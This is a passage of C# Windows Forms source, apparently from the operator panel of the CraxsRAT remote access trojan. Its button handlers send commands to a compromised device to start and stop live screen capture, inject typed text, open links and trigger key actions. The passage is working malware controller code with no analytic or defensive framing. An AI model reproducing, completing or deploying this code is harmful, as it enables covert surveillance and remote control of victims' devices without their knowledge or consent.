            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
        if (keepmeto)
        {
            pinbtn.ForeColor = Color.Lime;
            SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
            keepmeto = false;
        }
        else
        {
            pinbtn.ForeColor = Color.Red;
            SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
            keepmeto = true;
        }
    }

    private void PictureBox1_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKen" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button6_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void TSwitch1_CheckedChanged(object sender, EventArgs e)
    {

    }

    private void Button7_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button5_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Enterbutton_Click(object sender, EventArgs e)
    {
        if (classClient != null && textsend.Text.Length > 0)
        {
            object[] parametersObjects = new object[4]
            {
                classClient.myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            textsend.Text = "";
        }
    }

    private void pictureBox7_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(textsend.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void PictureBox14_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKeb" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void PictureBox10_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void PictureBox12_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKnn" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void PictureBox9_Click(object sender, EventArgs e)
    {
        this.WindowState = FormWindowState.Minimized;
    }

    private void PictureBox11_Click(object sender, EventArgs e)
    {
        PictureBox clickedPictureBox = (PictureBox)sender;

        // Toggle the selection status using the Tag property
        if (clickedPictureBox.Tag == null || System.Convert.ToString(clickedPictureBox.Tag) == "Unselected")
        {
            clickedPictureBox.Tag = "Selected";
            // Set the appearance for selected state, e.g., change the border color
            clickedPictureBox.BorderStyle = BorderStyle.Fixed3D;
        }
        else
        {
            clickedPictureBox.Tag = "Unselected";
            // Set the appearance for unselected state, e.g., reset the border color
            clickedPictureBox.BorderStyle = BorderStyle.None;
        }

        // Now you can perform actions based on the selection status
        if (System.Convert.ToString(clickedPictureBox.Tag) == "Selected")
        {
            Livepicbox.Enabled = true;
            LIVE = true;
            // Execute code for selected state
            if (classClient != null)
                try
                {
                    string[] array = classClient.Keys.Split(':');
                    object[] parametersObjects = new object[4]
                    {
                        Client,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        classClient
                    };
                    classClient.SendMessage(parametersObjects);
                }
                catch (Exception)
                {
                }
        }
        else
           
        // Execute code for unselected state
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                        Client,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
            }
    }

    private void StartButton_Click(object sender, EventArgs e)
    {
        if (classClient != null && !LIVE)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:on:" + Qualtibox.Text + "~" + FPSBOX.Text + "~" + classClient.ClientRemoteAddress + "~" + MySettingsProperty.Settings.resolution + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                toptitle.Text = "Connecting , Please Wait...";
                StartButton.Enabled = false;
                Guna2Button2.Enabled = true;
                vewpnl.Enabled = true;
                Livepicbox.Enabled = true;
                LIVE = true;
                refreshtimer.Enabled = true;
                refreshtimer.Start();
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Guna2Button2_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                toptitle.Text = "...";
                classClient.SendMessage(parametersObjects);
                StartButton.Enabled = true;
                Guna2Button2.Enabled = false;
                toptitle.Text = " ";
                vewpnl.Enabled = false;
                Livepicbox.Enabled = false;
                LIVE = false;
                refreshtimer.Stop();
                PBS.Value = 0;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Guna2Button5_Click(object sender, EventArgs e)
    {
        this.Close();
    }

    private void DrakeUILabel1_MouseDown(object sender, MouseEventArgs e)
    {
        try
        {
            if (e.Button == MouseButtons.Left)
            {
                Codes.ReleaseCapture();
                Codes.SendMessage(base.Handle, 161, 2, 0);
            }
        }
        catch (Exception)
        {
            //////CraxsAlert.Showinformation("Sorry"); ;
        }
    }
}
